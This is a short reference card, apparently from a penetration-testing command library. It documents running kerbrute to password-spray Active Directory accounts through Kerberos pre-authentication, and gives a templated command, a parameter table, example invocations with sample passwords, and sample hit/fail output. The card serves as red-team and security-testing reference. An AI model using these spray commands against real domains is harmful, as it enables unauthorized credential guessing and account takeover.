---
type: command
executor: bash
data: >-
  ./kerbrute_linux_amd64 passwordspray -d $_DOMAIN --dc $_DC_IP $_USERS_FILE
  $_PASSWORD -v --delay $_DELAY -o $_OUTPUT_FILE
output: null
created_at: '2023-04-06T03:56:04.255388+00:00'
updated_at: '2023-04-10T20:36:09.930886+00:00'
platforms:
  - Linux
tags:
  - spray
  - kerberos
verified: true
validated: true
---

# kerbrute-password-spray-single-password

## Command

```bash
./kerbrute_linux_amd64 passwordspray -d $_DOMAIN --dc $_DC_IP $_USERS_FILE $_PASSWORD -v --delay $_DELAY -o $_OUTPUT_FILE
```

## Description

This command performs password spraying by testing a single password against multiple usernames from a file, using Kerberos pre-auth to check validity without lockouts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -d $_DOMAIN | Target domain | Yes |
| --dc $_DC_IP | DC IP address | Yes |
| $_USERS_FILE | File with usernames | Yes |
| $_PASSWORD | Single password to spray | Yes |
| -v | Verbose output | No |
| --delay $_DELAY | Delay between requests (ms) | No |
| -o $_OUTPUT_FILE | Output log file | No |

## Examples

### Basic Usage

```bash
./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123
```

### Advanced Usage

```bash
./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o spray.log
```

## Expected Output

Valid hits in green, logged to file if specified:

```
[+] SUCCESS user@domain.local:123456
[-] FAIL otheruser@domain.local:123456
```

## Related

- [[procedures/Kerberos-Pre-Auth-Bruteforcing]]
- [[tools/kerbrute]]
